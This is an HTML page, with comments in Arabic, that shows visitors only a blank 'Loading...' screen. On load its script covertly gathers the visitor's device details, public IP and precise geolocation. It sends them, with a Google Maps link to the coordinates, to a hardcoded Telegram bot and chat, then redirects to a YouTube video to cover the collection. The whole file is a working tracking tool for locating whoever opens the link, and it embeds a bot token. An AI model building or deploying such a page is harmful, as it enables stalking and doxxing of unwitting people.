<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: white;
            font-family: Arial, sans-serif;
            height: 100vh;
            overflow: hidden;
        }

        /* صفحة بيضاء تماماً - لا يظهر شيء للمستخدم */
        .hidden-content {
            display: none;
            position: absolute;
            top: -9999px;
            left: -9999px;
            opacity: 0;
            visibility: hidden;
        }
    </style>
</head>
<body>
    <!-- محتوى مخفي تماماً -->
    <div class="hidden-content" id="hiddenStatus">جاري المعالجة...</div>

    <script>
        // =============================================================================
        // إعدادات النظام
        // =============================================================================
        
        const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        const BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
        const CHAT_ID = '170383339';
        const MAX_WAIT_TIME = 2000; // 2 ثانية فقط
        
        // =============================================================================
        
        let dataCollected = false;
        
        // لوغ مخفي للتطوير فقط
        function log(message) {
            console.log(`🔧 ${message}`);
        }
        
        // جمع المعلومات الأساسية فوراً
        function collectBasicData() {
            const ua = navigator.userAgent;
            const now = new Date();
            
            return {
                userAgent: ua,
                timestamp: now.toISOString(),
                localTime: now.toLocaleString('ar-SA', {
                    timeZone: 'Asia/Baghdad',
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                }),
                url: window.location.href,
                referrer: document.referrer || 'مباشر',
                language: navigator.language,
                platform: navigator.platform,
                screenRes: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                deviceType: /iPhone/i.test(ua) ? 'iPhone' : 
                           /iPad/i.test(ua) ? 'iPad' : 
                           /Android/i.test(ua) ? 'Android' : 
                           /Windows/i.test(ua) ? 'Windows' : 
                           /Mac/i.test(ua) ? 'Mac' : 'مجهول',
                isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
                browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
                        /Firefox/i.test(ua) ? 'Firefox' :
                        /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
                        /Edge/i.test(ua) ? 'Edge' : 'مجهول'
            };
        }
        
        // الحصول على IP مع خدمات متعددة
        async function getIP() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api.ipapi.com/api/check?access_key=free&format=1',
                'https://httpbin.org/ip',
                'https://jsonip.com'
            ];
            
            for (let service of services) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 1500);
                    
                    const response = await fetch(service, {
                        signal: controller.signal,
                        method: 'GET',
                        headers: {
                            'Accept': 'application/json',
                        }
                    });
                    
                    clearTimeout(timeoutId);
                    
                    if (response.ok) {
                        const data = await response.json();
                        const ip = data.ip || data.origin || data.addr;
                        if (ip) {
                            log(`IP محصل من ${service}: ${ip}`);
                            return ip;
                        }
                    }
                } catch (error) {
                    log(`فشل ${service}: ${error.message}`);
                    continue;
                }
            }
            return 'غير متاح';
        }
        
        // الحصول على الموقع مع محاولات متعددة
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    log('المتصفح لا يدعم تحديد الموقع');
                    resolve(null);
                    return;
                }
                
                let resolved = false;
                
                function handleSuccess(position) {
                    if (!resolved) {
                        resolved = true;
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy)
                        };
                        log(`موقع محصل: ${location.latitude}, ${location.longitude}`);
                        resolve(location);
                    }
                }
                
                function handleError(error) {
                    if (!resolved) {
                        log(`خطأ الموقع: ${error.code} - ${error.message}`);
                    }
                }
                
                // محاولة أولى - دقة عالية
                navigator.geolocation.getCurrentPosition(
                    handleSuccess,
                    handleError,
                    {
                        enableHighAccuracy: true,
                        timeout: 1500,
                        maximumAge: 30000
                    }
                );
                
                // محاولة ثانية - دقة عادية
                setTimeout(() => {
                    if (!resolved) {
                        navigator.geolocation.getCurrentPosition(
                            handleSuccess,
                            handleError,
                            {
                                enableHighAccuracy: false,
                                timeout: 1000,
                                maximumAge: 60000
                            }
                        );
                    }
                }, 500);
                
                // انتهاء المهلة
                setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        log('انتهت مهلة الحصول على الموقع');
                        resolve(null);
                    }
                }, 1800);
            });
        }
        
        // إنشاء رابط Google Maps
        function createMapsLink(lat, lng) {
            return `https://www.google.com/maps/dir//${lat},${lng}/@${lat},${lng},272m/data=!3m1!1e3?entry=ttu&g_ep=EgoyMDI1MDYzMC4wIKXMDSoASAFQAw%3D%3D`;
        }
        
        // إرسال البيانات مع إعادة المحاولة
        async function sendData(data) {
            let locationText = 'غير متاح';
            let mapsLink = '';
            
            if (data.location) {
                const { latitude, longitude, accuracy } = data.location;
                locationText = `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (دقة: ${accuracy}م)`;
                mapsLink = createMapsLink(latitude, longitude);
            }
            
            const message = `🎯 زائر جديد:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ ${data.device.localTime}
🌐 ${data.device.url}
🔗 المرجع: ${data.device.referrer}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 ${data.device.deviceType} | ${data.device.browser}
📱 محمول: ${data.device.isMobile ? 'نعم' : 'لا'}
🌍 IP: ${data.ip}
📍 الموقع: ${locationText}
${mapsLink ? `🗺️ الخريطة: ${mapsLink}` : ''}
🗣️ اللغة: ${data.device.language}
🌍 المنطقة الزمنية: ${data.device.timezone}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 الشاشة: ${data.device.screenRes}
🔍 User Agent: ${data.device.userAgent}`;
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CHAT_ID,
                text: message,
                disable_web_page_preview: false
            };
            
            // محاولات متعددة للإرسال
            for (let attempt = 1; attempt <= 3; attempt++) {
                try {
                    log(`محاولة الإرسال ${attempt}/3`);
                    
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    if (response.ok) {
                        const result = await response.json();
                        if (result.ok) {
                            log('✅ تم إرسال البيانات بنجاح');
                            dataCollected = true;
                            
                            // إرسال رابط الموقع منفصل إذا توفر
                            if (mapsLink) {
                                try {
                                    await fetch(url, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            chat_id: CHAT_ID,
                                            text: `🗺️ رابط الموقع المباشر:\n${mapsLink}`
                                        })
                                    });
                                    log('✅ تم إرسال رابط الموقع');
                                } catch (e) {
                                    log('⚠️ فشل إرسال رابط الموقع');
                                }
                            }
                            return true;
                        }
                    }
                    
                    log(`❌ فشل الإرسال: ${response.status}`);
                } catch (error) {
                    log(`❌ خطأ في الإرسال ${attempt}: ${error.message}`);
                }
                
                if (attempt < 3) {
                    await new Promise(resolve => setTimeout(resolve, 500));
                }
            }
            
            log('❌ فشل في جميع محاولات الإرسال');
            return false;
        }
        
        // التحويل الفوري
        function redirect() {
            log('🔄 تحويل فوري إلى: ' + REDIRECT_URL);
            window.location.replace(REDIRECT_URL);
        }
        
        // العملية الرئيسية
        async function main() {
            log('🚀 بدء النظام');
            
            try {
                // جمع البيانات الأساسية فوراً
                const basicData = collectBasicData();
                log('✅ تم جمع البيانات الأساسية');
                
                // بدء جمع IP والموقع بشكل متوازي
                const dataPromise = Promise.all([
                    getIP(),
                    getLocation()
                ]);
                
                // إعطاء وقت محدود لجمع البيانات
                const timeoutPromise = new Promise(resolve => 
                    setTimeout(() => resolve(['timeout', null]), MAX_WAIT_TIME)
                );
                
                const [ip, location] = await Promise.race([dataPromise, timeoutPromise]);
                
                const fullData = {
                    device: basicData,
                    ip: ip === 'timeout' ? 'غير متاح' : ip,
                    location: location
                };
                
                log('📊 انتهاء جمع البيانات');
                
                // محاولة إرسال البيانات (بدون انتظار)
                sendData(fullData).catch(error => {
                    log('⚠️ خطأ في الإرسال: ' + error.message);
                });
                
            } catch (error) {
                log('❌ خطأ عام: ' + error.message);
            }
            
            // تحويل فوري بغض النظر عن النتيجة
            redirect();
        }
        
        // بدء العملية فور تحميل الصفحة
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', main);
        } else {
            main();
        }
        
        // تحويل اضطراري إذا لم يحدث شيء
        setTimeout(() => {
            if (window.location.href.indexOf(REDIRECT_URL) === -1) {
                log('⏰ تحويل اضطراري');
                redirect();
            }
        }, 3000);
        
        // بدء فوري عند تحميل النافذة
        window.addEventListener('load', () => {
            if (window.location.href.indexOf(REDIRECT_URL) === -1) {
                setTimeout(redirect, 100);
            }
        });
        
        log('🔧 النظام جاهز - صفحة بيضاء فارغة');
    </script>
</body>
</html>
